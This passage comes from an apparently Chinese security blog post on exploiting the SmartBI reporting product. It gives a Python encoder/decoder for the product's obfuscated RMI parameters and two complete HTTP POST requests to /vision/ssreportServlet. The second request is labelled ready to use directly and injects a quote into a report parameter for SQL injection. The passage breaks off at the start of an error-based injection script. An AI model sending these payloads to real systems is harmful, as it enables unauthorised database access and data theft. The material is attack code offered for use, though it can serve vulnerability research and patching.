class="string">&quot;W&quot;</span>: <span class="string">&quot;S&quot;</span>, <span class="string">&quot;*&quot;</span>: <span class="string">&quot;T&quot;</span>, <span class="string">&quot;z&quot;</span>: <span class="string">&quot;U&quot;</span>, <span class="string">&quot;Z&quot;</span>: <span class="string">&quot;V&quot;</span>, <span class="string">&quot;!&quot;</span>: <span class="string">&quot;W&quot;</span>, <span class="string">&quot;B&quot;</span>: <span class="string">&quot;X&quot;</span>, <span class="string">&quot;)&quot;</span>: <span class="string">&quot;Y&quot;</span>, </span><br><span class="line">    <span class="string">&quot;U&quot;</span>: <span class="string">&quot;Z&quot;</span>, <span class="string">&quot;(&quot;</span>: <span class="string">&quot;a&quot;</span>, <span class="string">&quot;~&quot;</span>: <span class="string">&quot;b&quot;</span>, <span class="string">&quot;i&quot;</span>: <span class="string">&quot;c&quot;</span>, <span class="string">&quot;h&quot;</span>: <span class="string">&quot;d&quot;</span>, <span class="string">&quot;p&quot;</span>: <span class="string">&quot;e&quot;</span>, <span class="string">&quot;_&quot;</span>: <span class="string">&quot;f&quot;</span>, <span class="string">&quot;-&quot;</span>: <span class="string">&quot;g&quot;</span>, <span class="string">&quot;I&quot;</span>: <span class="string">&quot;h&quot;</span>, <span class="string">&quot;R&quot;</span>: <span class="string">&quot;i&quot;</span>, <span class="string">&quot;.&quot;</span>: <span class="string">&quot;j&quot;</span>, </span><br><span class="line">    <span class="string">&quot;G&quot;</span>: <span class="string">&quot;k&quot;</span>, <span class="string">&quot;S&quot;</span>: <span class="string">&quot;l&quot;</span>, <span class="string">&quot;d&quot;</span>: <span class="string">&quot;m&quot;</span>, <span class="string">&quot;6&quot;</span>: <span class="string">&quot;n&quot;</span>, <span class="string">&quot;w&quot;</span>: <span class="string">&quot;o&quot;</span>, <span class="string">&quot;5&quot;</span>: <span class="string">&quot;p&quot;</span>, <span class="string">&quot;0&quot;</span>: <span class="string">&quot;q&quot;</span>, <span class="string">&quot;4&quot;</span>: <span class="string">&quot;r&quot;</span>, <span class="string">&quot;D&quot;</span>: <span class="string">&quot;s&quot;</span>, <span class="string">&quot;k&quot;</span>: <span class="string">&quot;t&quot;</span>, <span class="string">&quot;Q&quot;</span>: <span class="string">&quot;u&quot;</span>, </span><br><span class="line">    <span class="string">&quot;g&quot;</span>: <span class="string">&quot;v&quot;</span>, <span class="string">&quot;b&quot;</span>: <span class="string">&quot;w&quot;</span>, <span class="string">&quot;C&quot;</span>: <span class="string">&quot;x&quot;</span>, <span class="string">&quot;2&quot;</span>: <span class="string">&quot;y&quot;</span>, <span class="string">&quot;X&quot;</span>: <span class="string">&quot;z&quot;</span>, <span class="string">&quot;e&quot;</span>: <span class="string">&quot;~&quot;</span>, <span class="string">&quot;y&quot;</span>: <span class="string">&quot;_&quot;</span>, </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#此函数可以用来加密明文也可以解密服务器返回的密文</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">code</span>):</span></span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> code:</span><br><span class="line">        out = out + ENCODING_SCHEDULE.get(item, item)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">code</span>):</span></span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> code:</span><br><span class="line">        out = out + DECODING_SCHEDULE.get(item, item)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>():</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;read.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line">a=read()</span><br><span class="line">b = decode(a)</span><br><span class="line">c = encode(a)</span><br><span class="line">print(<span class="string">&#x27;Input:     &#x27;</span> + a + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27;decode:    &#x27;</span> + b + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27;decode-unquote-url:   &#x27;</span>+unquote(b,<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">&#x27;encode:   &#x27;</span>+c)</span><br><span class="line">print()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>注：加密和解密的过程就是替换字符的过程，最终解密得到的是url编码，加密时传入的文本也要是url编码</p>
<p>decode-unquote-url只是为了方便阅读</p>
<p><img src="/2021/01/12/smartBi%E6%80%BB%E7%BB%93/image-20210112123136822.png" alt="image-20210112123136822"></p>
<h1 id="SQl注入"><a href="#SQl注入" class="headerlink" title="SQl注入"></a>SQl注入</h1><p>需要登录，任意报表功能</p>
<p><img src="/2021/01/12/smartBi%E6%80%BB%E7%BB%93/image-20210112183048585.png" alt="image-20210112183048585"></p>
<p><a target="_blank" rel="noopener" href="https://127.0.0.1/vision/ssreportServlet">https://127.0.0.1/vision/ssreportServlet</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;vision&#x2F;ssreportServlet HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;99.0.7113.93 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https:&#x2F;&#x2F;127.0.0.1&#x2F;vision&#x2F;openresource.jsp?iPad&#x3D;true&amp;refresh&#x3D;true&amp;showtoolbar&#x3D;false&amp;showPath&#x3D;false&amp;resid&#x3D;I40281d81016a8bc28bc20231016aaee007b230ac&amp;_timestamp&#x3D;1610433924926</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 3293</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4&#x3D;</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: FQPassword&#x3D;; JSESSIONID&#x3D;4BB550BF10C606619B753D3CE52CD3AB</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">sheetIndex&#x3D;0&amp;resid&#x3D;I40281d81016a8bc28bc20231016aaee007b230ac&amp;clientId&#x3D;Iff8080810176f0c7f0c7544f0176f54eb72c1160&amp;refreshType&#x3D;refresh&amp;paramsInfoEncode&#x3D;encode&#x3D;&#x2F;JV&#x2F;9V&#x2F;uuRh&#x2F;uu&#x2F;NO&#x2F;uuoQk5QkL(4(dpkp4qcK7u&#39;1h&#39;171M(&#39;~iu&#39;~iu7uN171M((7~pu1m9u&#39;~Mq&#x2F;aJ&#x2F;&#39;T&#x2F;mJ&#x2F;aK&#x2F;VT&#x2F;&#39;T&#x2F;aJ&#x2F;m7&#x2F;&#39;T&#x2F;a9&#x2F;O9&#x2F;V7&#x2F;uu&#x2F;ut&#x2F;uu6(dp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aJ&#x2F;&#39;T&#x2F;mJ&#x2F;aK&#x2F;VT&#x2F;&#39;T&#x2F;aJ&#x2F;m7&#x2F;&#39;T&#x2F;a9&#x2F;O9&#x2F;V7&#x2F;uu&#x2F;ut&#x2F;uu(SR(D&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aJ&#x2F;&#39;T&#x2F;mJ&#x2F;aK&#x2F;VT&#x2F;&#39;T&#x2F;aJ&#x2F;m7&#x2F;&#39;T&#x2F;a9&#x2F;O9&#x2F;V7&#x2F;uu&#x2F;ut&#x2F;uug(SQp&#x2F;uu&#x2F;NO&#x2F;uun111&#x2F;uu&#x2F;ut&#x2F;uuhRD5S(2Z(SQp&#x2F;uu&#x2F;NO&#x2F;uun111&#x2F;uu&#x2F;9T&#x2F;ut&#x2F;9V&#x2F;uuRh&#x2F;uu&#x2F;NO&#x2F;uuoQk5QkL(4(dpkp4qcK7u&#39;1h&#39;171M(&#39;~iu&#39;~iu7uN171M((7~pu1m9u&#39;~Mq&#x2F;aM&#x2F;&#39;m&#x2F;&#39;7&#x2F;aJ&#x2F;V1&#x2F;ma&#x2F;aM&#x2F;mt&#x2F;VO&#x2F;aM&#x2F;ma&#x2F;&#39;K&#x2F;uu&#x2F;ut&#x2F;uu6(dp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aM&#x2F;&#39;m&#x2F;&#39;7&#x2F;aJ&#x2F;V1&#x2F;ma&#x2F;aM&#x2F;mt&#x2F;VO&#x2F;aM&#x2F;ma&#x2F;&#39;K&#x2F;uu&#x2F;ut&#x2F;uu(SR(D&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aM&#x2F;&#39;m&#x2F;&#39;7&#x2F;aJ&#x2F;V1&#x2F;ma&#x2F;aM&#x2F;mt&#x2F;VO&#x2F;aM&#x2F;ma&#x2F;&#39;K&#x2F;uu&#x2F;ut&#x2F;uug(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;uu&#x2F;ut&#x2F;uuhRD5S(2Z(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;uu&#x2F;9T&#x2F;ut&#x2F;9V&#x2F;uuRh&#x2F;uu&#x2F;NO&#x2F;uuoQk5QkL(4(dpkp4qcK7u&#39;1h&#39;171M(&#39;~iu&#39;~iu7uN171M((7~pu1m9u&#39;~Mq&#x2F;aM&#x2F;&#39;m&#x2F;&#39;7&#x2F;aJ&#x2F;mt&#x2F;O&#39;&#x2F;a9&#x2F;mt&#x2F;&#39;1&#x2F;aK&#x2F;VV&#x2F;VT&#x2F;uu&#x2F;ut&#x2F;uu6(dp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aM&#x2F;&#39;m&#x2F;&#39;7&#x2F;aJ&#x2F;mt&#x2F;O&#39;&#x2F;a9&#x2F;mt&#x2F;&#39;1&#x2F;aK&#x2F;VV&#x2F;VT&#x2F;uu&#x2F;ut&#x2F;uu(SR(D&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aM&#x2F;&#39;m&#x2F;&#39;7&#x2F;aJ&#x2F;mt&#x2F;O&#39;&#x2F;a9&#x2F;mt&#x2F;&#39;1&#x2F;aK&#x2F;VV&#x2F;VT&#x2F;uu&#x2F;ut&#x2F;uug(SQp&#x2F;uu&#x2F;NO&#x2F;uuKK7777&#x2F;uu&#x2F;ut&#x2F;uuhRD5S(2Z(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aJ&#x2F;Vm&#x2F;Vx&#x2F;aK&#x2F;V&#39;&#x2F;mt&#x2F;uu&#x2F;9T&#x2F;ut&#x2F;9V&#x2F;uuRh&#x2F;uu&#x2F;NO&#x2F;uuoQk5QkL(4(dpkp4qcK7u&#39;1h&#39;171M(&#39;~iu&#39;~iu7uN171M((7~pu1m9u&#39;~Mq&#x2F;aM&#x2F;&#39;m&#x2F;&#39;7&#x2F;aJ&#x2F;mt&#x2F;O&#39;&#x2F;aJ&#x2F;mt&#x2F;V7&#x2F;aJ&#x2F;V&#39;&#x2F;&#39;u&#x2F;uu&#x2F;ut&#x2F;uu6(dp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aM&#x2F;&#39;m&#x2F;&#39;7&#x2F;aJ&#x2F;mt&#x2F;O&#39;&#x2F;aJ&#x2F;mt&#x2F;V7&#x2F;aJ&#x2F;V&#39;&#x2F;&#39;u&#x2F;uu&#x2F;ut&#x2F;uu(SR(D&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aM&#x2F;&#39;m&#x2F;&#39;7&#x2F;aJ&#x2F;mt&#x2F;O&#39;&#x2F;aJ&#x2F;mt&#x2F;V7&#x2F;aJ&#x2F;V&#39;&#x2F;&#39;u&#x2F;uu&#x2F;ut&#x2F;uug(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;uu&#x2F;ut&#x2F;uuhRD5S(2Z(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aJ&#x2F;&#39;J&#x2F;O&#39;&#x2F;am&#x2F;&#39;N&#x2F;O&#39;&#x2F;uu&#x2F;9T&#x2F;ut&#x2F;9V&#x2F;uuRh&#x2F;uu&#x2F;NO&#x2F;uuoQk5QkL(4(dpkp4qcK7u&#39;1h&#39;171M(&#39;~iu&#39;~iu7uN171M((7~pu1m9u&#39;~Mq&#x2F;aM&#x2F;&#39;m&#x2F;&#39;7&#x2F;aJ&#x2F;mt&#x2F;O&#39;&#x2F;aJ&#x2F;&#39;t&#x2F;VO&#x2F;aJ&#x2F;&#39;a&#x2F;Vx&#x2F;uu&#x2F;ut&#x2F;uu6(dp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aM&#x2F;&#39;m&#x2F;&#39;7&#x2F;aJ&#x2F;mt&#x2F;O&#39;&#x2F;aJ&#x2F;&#39;t&#x2F;VO&#x2F;aJ&#x2F;&#39;a&#x2F;Vx&#x2F;uu&#x2F;ut&#x2F;uu(SR(D&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aM&#x2F;&#39;m&#x2F;&#39;7&#x2F;aJ&#x2F;mt&#x2F;O&#39;&#x2F;aJ&#x2F;&#39;t&#x2F;VO&#x2F;aJ&#x2F;&#39;a&#x2F;Vx&#x2F;uu&#x2F;ut&#x2F;uug(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;uu&#x2F;ut&#x2F;uuhRD5S(2Z(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aJ&#x2F;&#39;J&#x2F;O&#39;&#x2F;am&#x2F;&#39;N&#x2F;O&#39;&#x2F;uu&#x2F;9T&#x2F;ut&#x2F;9V&#x2F;uuRh&#x2F;uu&#x2F;NO&#x2F;uuoQk5QkL(4(dpkp4qcK7u&#39;1h&#39;171M(&#39;~iu&#39;~iu7uN171M((7~pu1m9u&#39;~MqRh&#x2F;uu&#x2F;ut&#x2F;uu6(dp&#x2F;uu&#x2F;NO&#x2F;uuRh&#x2F;uu&#x2F;ut&#x2F;uu(SR(D&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aM&#x2F;ON&#x2F;&#39;7&#x2F;aM&#x2F;VJ&#x2F;&#39;V&#x2F;aM&#x2F;mt&#x2F;VO&#x2F;aM&#x2F;ma&#x2F;&#39;KRh&#x2F;uu&#x2F;ut&#x2F;uug(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;uu&#x2F;ut&#x2F;uuhRD5S(2Z(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;uu&#x2F;9T&#x2F;ut&#x2F;9V&#x2F;uuRh&#x2F;uu&#x2F;NO&#x2F;uuoQk5QkL(4(dpkp4qcK7u&#39;1h&#39;171M(&#39;~iu&#39;~iu7uN171M((7~pu1m9u&#39;~Mq&#x2F;aJ&#x2F;O1&#x2F;OV&#x2F;aM&#x2F;&#39;O&#x2F;OJ&#x2F;aM&#x2F;m9&#x2F;VM&#x2F;am&#x2F;m9&#x2F;VK&#x2F;a&#39;&#x2F;VJ&#x2F;V9&#x2F;uu&#x2F;ut&#x2F;uu6(dp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aJ&#x2F;O1&#x2F;OV&#x2F;aM&#x2F;&#39;O&#x2F;OJ&#x2F;aM&#x2F;m9&#x2F;VM&#x2F;am&#x2F;m9&#x2F;VK&#x2F;a&#39;&#x2F;VJ&#x2F;V9&#x2F;uu&#x2F;ut&#x2F;uu(SR(D&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aJ&#x2F;O1&#x2F;OV&#x2F;aM&#x2F;&#39;O&#x2F;OJ&#x2F;aM&#x2F;m9&#x2F;VM&#x2F;am&#x2F;m9&#x2F;VK&#x2F;a&#39;&#x2F;VJ&#x2F;V9&#x2F;uu&#x2F;ut&#x2F;uug(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;uu&#x2F;ut&#x2F;uuhRD5S(2Z(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;uu&#x2F;9T&#x2F;ut&#x2F;9V&#x2F;uuRh&#x2F;uu&#x2F;NO&#x2F;uuoQk5QkL(4(dpkp4qcK7u&#39;1h&#39;171M(&#39;~iu&#39;~iu7uN171M((7~pu1m9u&#39;~Mq&#x2F;aJ&#x2F;O1&#x2F;OV&#x2F;aM&#x2F;&#39;O&#x2F;OJ&#x2F;aM&#x2F;m9&#x2F;VM&#x2F;am&#x2F;m9&#x2F;VK&#x2F;aM&#x2F;OT&#x2F;Ou&#x2F;uu&#x2F;ut&#x2F;uu6(dp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aJ&#x2F;O1&#x2F;OV&#x2F;aM&#x2F;&#39;O&#x2F;OJ&#x2F;aM&#x2F;m9&#x2F;VM&#x2F;am&#x2F;m9&#x2F;VK&#x2F;aM&#x2F;OT&#x2F;Ou&#x2F;uu&#x2F;ut&#x2F;uu(SR(D&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aJ&#x2F;O1&#x2F;OV&#x2F;aM&#x2F;&#39;O&#x2F;OJ&#x2F;aM&#x2F;m9&#x2F;VM&#x2F;am&#x2F;m9&#x2F;VK&#x2F;aM&#x2F;OT&#x2F;Ou&#x2F;uu&#x2F;ut&#x2F;uug(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;uu&#x2F;ut&#x2F;uuhRD5S(2Z(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;uu&#x2F;9T&#x2F;ut&#x2F;9V&#x2F;uuRh&#x2F;uu&#x2F;NO&#x2F;uuoQk5QkL(4(dpkp4qcK7u&#39;1h&#39;171M(&#39;~iu&#39;~iu7uN171M((7~pu1m9u&#39;~Mq&#x2F;aM&#x2F;mV&#x2F;VK&#x2F;aM&#x2F;mM&#x2F;V7&#x2F;aM&#x2F;m9&#x2F;VM&#x2F;am&#x2F;m9&#x2F;VK&#x2F;a&#39;&#x2F;VJ&#x2F;V9&#x2F;uu&#x2F;ut&#x2F;uu6(dp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aM&#x2F;mV&#x2F;VK&#x2F;aM&#x2F;mM&#x2F;V7&#x2F;aM&#x2F;m9&#x2F;VM&#x2F;am&#x2F;m9&#x2F;VK&#x2F;a&#39;&#x2F;VJ&#x2F;V9&#x2F;uu&#x2F;ut&#x2F;uu(SR(D&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aM&#x2F;mV&#x2F;VK&#x2F;aM&#x2F;mM&#x2F;V7&#x2F;aM&#x2F;m9&#x2F;VM&#x2F;am&#x2F;m9&#x2F;VK&#x2F;a&#39;&#x2F;VJ&#x2F;V9&#x2F;uu&#x2F;ut&#x2F;uug(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;uu&#x2F;ut&#x2F;uuhRD5S(2Z(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;uu&#x2F;9T&#x2F;ut&#x2F;9V&#x2F;uuRh&#x2F;uu&#x2F;NO&#x2F;uuoQk5QkL(4(dpkp4qcK7u&#39;1h&#39;171M(&#39;~iu&#39;~iu7uN171M((7~pu1m9u&#39;~Mq&#x2F;aM&#x2F;mV&#x2F;VK&#x2F;aM&#x2F;mM&#x2F;V7&#x2F;aM&#x2F;m9&#x2F;VM&#x2F;am&#x2F;m9&#x2F;VK&#x2F;aM&#x2F;OT&#x2F;Ou&#x2F;uu&#x2F;ut&#x2F;uu6(dp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aM&#x2F;mV&#x2F;VK&#x2F;aM&#x2F;mM&#x2F;V7&#x2F;aM&#x2F;m9&#x2F;VM&#x2F;am&#x2F;m9&#x2F;VK&#x2F;aM&#x2F;OT&#x2F;Ou&#x2F;uu&#x2F;ut&#x2F;uu(SR(D&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aM&#x2F;mV&#x2F;VK&#x2F;aM&#x2F;mM&#x2F;V7&#x2F;aM&#x2F;m9&#x2F;VM&#x2F;am&#x2F;m9&#x2F;VK&#x2F;aM&#x2F;OT&#x2F;Ou&#x2F;uu&#x2F;ut&#x2F;uug(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;uu&#x2F;ut&#x2F;uuhRD5S(2Z(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;uu&#x2F;9T&#x2F;JT&amp;pageId&#x3D;0&amp;writeBackData&#x3D;&amp;exportSheetIndexes&#x3D;&amp;exportId&#x3D;&amp;op&#x3D;%7B%22getTotalPages%22%3Atrue%2C%22sheetPageCounts%22%3A%5B1%5D%7D</span><br></pre></td></tr></table></figure>
<h2 id="解码并修改数据包直接注入（可直接使用）："><a href="#解码并修改数据包直接注入（可直接使用）：" class="headerlink" title="解码并修改数据包直接注入（可直接使用）："></a>解码并修改数据包直接注入（可直接使用）：</h2><p>修改paramsInfoEncode为paramsInfo，将Encode参数去掉</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;vision&#x2F;ssreportServlet HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;99.0.7113.93 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https:&#x2F;&#x2F;127.0.0.1&#x2F;vision&#x2F;openresource.jsp?iPad&#x3D;true&amp;refresh&#x3D;true&amp;showtoolbar&#x3D;false&amp;showPath&#x3D;false&amp;resid&#x3D;I40281d81016a8bc28bc20231016aaee007b230ac&amp;_timestamp&#x3D;1610433924926</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 3282</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4&#x3D;</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: FQPassword&#x3D;; JSESSIONID&#x3D;4BB550BF10C606619B753D3CE52CD3AB</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">sheetIndex&#x3D;0&amp;resid&#x3D;I40281d81016a8bc28bc20231016aaee007b230ac&amp;clientId&#x3D;Iff8080810176f0c7f0c7544f0176f54eb72c1160&amp;refreshType&#x3D;refresh&amp;paramsInfo&#x3D;%5B%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E5%8D%95%E4%BD%8D%E5%90%8D%E7%A7%B0%22%2C%22name%22%3A%22%E5%8D%95%E4%BD%8D%E5%90%8D%E7%A7%B0%22%2C%22alias%22%3A%22%E5%8D%95%E4%BD%8D%E5%90%8D%E7%A7%B0%22%2C%22value%22%3A%22&#39;11111%22%2C%22displayValue%22%3A%22&#39;11111%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E6%89%80%E5%B1%9E%E6%9C%BA%E6%9E%84%22%2C%22name%22%3A%22%E6%89%80%E5%B1%9E%E6%9C%BA%E6%9E%84%22%2C%22alias%22%3A%22%E6%89%80%E5%B1%9E%E6%9C%BA%E6%9E%84%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E6%89%80%E5%9C%A8%E7%9C%81%E4%BB%BD%22%2C%22name%22%3A%22%E6%89%80%E5%9C%A8%E7%9C%81%E4%BB%BD%22%2C%22alias%22%3A%22%E6%89%80%E5%9C%A8%E7%9C%81%E4%BB%BD%22%2C%22value%22%3A%22440000%22%2C%22displayValue%22%3A%22%E5%B9%BF%E4%B8%9C%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E6%89%80%E5%9C%A8%E5%9C%B0%E5%B8%82%22%2C%22name%22%3A%22%E6%89%80%E5%9C%A8%E5%9C%B0%E5%B8%82%22%2C%22alias%22%3A%22%E6%89%80%E5%9C%A8%E5%9C%B0%E5%B8%82%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%E5%85%A8%E9%83%A8%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E6%89%80%E5%9C%A8%E5%8C%BA%E5%8E%BF%22%2C%22name%22%3A%22%E6%89%80%E5%9C%A8%E5%8C%BA%E5%8E%BF%22%2C%22alias%22%3A%22%E6%89%80%E5%9C%A8%E5%8C%BA%E5%8E%BF%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%E5%85%A8%E9%83%A8%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.id%22%2C%22name%22%3A%22id%22%2C%22alias%22%3A%22%E6%A3%80%E6%B5%8B%E6%9C%BA%E6%9E%84id%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E5%A1%AB%E6%8A%A5%E6%97%B6%E9%97%B4%E8%B5%B7%22%2C%22name%22%3A%22%E5%A1%AB%E6%8A%A5%E6%97%B6%E9%97%B4%E8%B5%B7%22%2C%22alias%22%3A%22%E5%A1%AB%E6%8A%A5%E6%97%B6%E9%97%B4%E8%B5%B7%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E5%A1%AB%E6%8A%A5%E6%97%B6%E9%97%B4%E6%AD%A2%22%2C%22name%22%3A%22%E5%A1%AB%E6%8A%A5%E6%97%B6%E9%97%B4%E6%AD%A2%22%2C%22alias%22%3A%22%E5%A1%AB%E6%8A%A5%E6%97%B6%E9%97%B4%E6%AD%A2%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4%E8%B5%B7%22%2C%22name%22%3A%22%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4%E8%B5%B7%22%2C%22alias%22%3A%22%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4%E8%B5%B7%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4%E6%AD%A2%22%2C%22name%22%3A%22%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4%E6%AD%A2%22%2C%22alias%22%3A%22%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4%E6%AD%A2%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%22%7D%5D&amp;pageId&#x3D;0&amp;writeBackData&#x3D;&amp;exportSheetIndexes&#x3D;&amp;exportId&#x3D;&amp;op&#x3D;%7B%22getTotalPages%22%3Atrue%2C%22sheetPageCounts%22%3A%5B1%5D%7D</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/12/smartBi%E6%80%BB%E7%BB%93/image-20210112145030005.png" alt="image-20210112145030005"></p>
<h2 id="py脚本RMI加密后注入"><a href="#py脚本RMI加密后注入" class="headerlink" title="py脚本RMI加密后注入"></a>py脚本RMI加密后注入</h2><p>报错注入demo：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 